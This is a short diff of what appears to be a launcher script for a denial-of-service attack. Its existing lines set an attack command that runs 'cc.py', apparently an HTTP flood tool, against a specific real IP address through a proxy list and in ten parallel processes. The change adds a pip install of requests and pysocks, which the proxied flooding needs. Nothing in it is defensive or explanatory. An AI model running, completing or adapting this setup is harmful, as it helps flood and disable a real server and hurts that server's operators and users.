@@ -8,6 +8,8 @@
 #the command you want to exec
 atk_cmd="python3 cc.py -url http://38.27.122.177/ -f proxy.txt -v 1 -s 30"
 
+pip3 install requests pysocks
+
 #number of process that you want
 process=10
 
